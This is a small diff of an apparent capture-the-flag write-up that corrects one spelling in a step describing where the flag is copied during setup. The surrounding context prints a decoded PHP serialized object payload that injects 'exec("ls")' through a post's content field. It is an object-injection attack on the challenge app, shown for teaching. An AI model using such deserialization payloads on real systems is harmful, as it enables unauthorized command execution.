@@ -21,7 +21,7 @@ It looks like this once decoded.
 ```
 O:4:"User":2:{s:7:"profile";O:7:"Profile":2:{s:8:"username";s:1:"1";s:12:"picture_path";s:27:"images/real_programmers.png";}s:5:"posts";a:1:{i:0;O:4:"Post":3:{s:5:"title";s:5:"title";s:7:"content";s:17:"$txt = exec("ls")";s:8:"comments";s:3:"txt";}}}
 ```
-3. Upon investigating the source code that was shared along with the challange we found that during the infrastructure setup the flag is copied to following directory.
+3. Upon investigating the source code that was shared along with the challenge we found that during the infrastructure setup the flag is copied to following directory.
 ```
 FROM php:8.0-apache
 
